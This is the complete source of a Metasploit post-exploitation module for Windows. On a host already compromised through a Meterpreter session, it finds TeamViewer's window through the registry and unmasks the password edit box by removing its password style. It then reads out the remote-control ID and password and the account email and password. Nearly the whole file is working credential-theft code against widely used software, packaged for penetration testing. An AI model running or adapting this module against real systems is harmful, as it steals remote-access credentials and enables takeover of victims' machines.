##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Get TeamViewer ID Password',
        'Description' => %q{
          This module allows to enumerate window information to get the control ID and Password
          of TeamViewer. Remove the style of password edit box to get the password and Email
          Just when the password is still in the edit box,So you may not get password. Good luck
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Kali-Team <kali-team[at]qq.com>' ],
        'References' => [ 'URL', 'https://www.cnblogs.com/Kali-Team/p/12468066.html' ],
        'Platform' => [ 'win' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('WINDOW_TITLE', [ false, 'Specify a title for getting the window handle, If the registry does not work, e.g.:TeamViewer', 'TeamViewer']),
      ]
    )
  end

  def get_window_text(window_hwnd)
    if window_hwnd
      addr = session.railgun.util.alloc_and_write_wstring('Kali-Team')
      client.railgun.user32.SendMessageW(window_hwnd, 'WM_GETTEXT', 1024, addr)
      text = session.railgun.util.read_wstring(addr)
      client.railgun.multi([
        ['kernel32', 'VirtualFree', [addr, 0, MEM_RELEASE]],
      ])
      if text == ''
        return 'The content of this edit box is empty'
      else
        return text
      end
    else
      return nil
    end
  end

  # EnumWindows Function not work in RailGun, I don't know how to define the lpEnumFunc parameter
  def enum_id_and_password(hwnd_main)
    hwnd_mwrcp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'MainWindowRemoteControlPage', nil)
    hwnd_irccv = client.railgun.user32.FindWindowExW(hwnd_mwrcp['return'], nil, 'IncomingRemoteControlComponentView', nil)
    hwnd_custom_runner_id = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], nil, 'CustomRunner', nil)
    hwnd_custom_runner_pass = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], hwnd_custom_runner_id['return'], 'CustomRunner', nil)
    #  find edit box handle
    hwnd_id_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_id['return'], nil, 'Edit', nil)
    print_status("Found handle to ID edit box #{hwnd_id_edit_box['return'].to_s(16).rjust(8, '0')}")
    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_pass['return'], nil, 'Edit', nil)
    print_status("Found handle to Password edit box #{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}")
    #  get window text
    if hwnd_id_edit_box['return'] && hwnd_pass_edit_box['return']
      print_good("ID: #{get_window_text(hwnd_id_edit_box['return'])}")
      print_good("PASSWORD: #{get_window_text(hwnd_pass_edit_box['return'])}")
    else
      print_error('Handle for TeamViewer ID or password edit box not found')
    end
  end

  def enum_email_and_password(hwnd_main)
    hwnd_lp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'LoginPage', nil)
    hwnd_lfv = client.railgun.user32.FindWindowExW(hwnd_lp['return'], nil, 'LoginFormView', nil)
    #  find edit box handle
    hwnd_email_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], nil, 'Edit', nil)
    print_status("Found handle to Email edit box #{hwnd_email_edit_box['return'].to_s(16).rjust(8, '0')}")
    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], hwnd_email_edit_box['return'], 'Edit', nil)
    print_status("Found handle to Password edit box #{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}")
    #  Remove ES_PASSWORD style
    #  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowlongw
    #  https://docs.microsoft.com/en-us/windows/win32/controls/edit-control-styles
    #  GWL_STYLE  -16
    client.railgun.user32.SetWindowWord(hwnd_pass_edit_box['return'], -16, 0)
    #  get window text
    if hwnd_email_edit_box['return'] && hwnd_pass_edit_box['return']
      print_good("EMAIL: #{get_window_text(hwnd_email_edit_box['return'])}")
      print_good("PASSWORD: #{get_window_text(hwnd_pass_edit_box['return'])}")
    else
      print_error('Handle for TeamViewer ID or Password edit box not found')
    end
  end

  # Main method
  def run
    #  Because of the different languages of the system, the title of the window is changed,
    #  so I use to read the handle of the main window in the registry
    parent_key = 'HKEY_CURRENT_USER\\Software\\TeamViewer'
    hwnd = registry_getvaldata(parent_key, 'MainWindowHandle')
    language = registry_getvaldata(parent_key, 'SelectedLanguage')
    version = registry_getvaldata(parent_key, 'IntroscreenShownVersion')
    print_status("TeamViewer's language setting options are '#{language}'")
    print_status("TeamViewer's version is '#{version}'")

    #  Try to get window handle through API
    if !hwnd
      hwnd = client.railgun.user32.FindWindowW('#32770', datastore['WINDOW_TITLE'])['return']
    end
    if hwnd != 0
      print_good("TeamViewer's  title is '#{get_window_text(hwnd)}'")
      enum_id_and_password(hwnd)
      enum_email_and_password(hwnd)
    else
      print_error('Handle not found for TeamViewer window. Try to set window title')
      return false
    end
  end
end
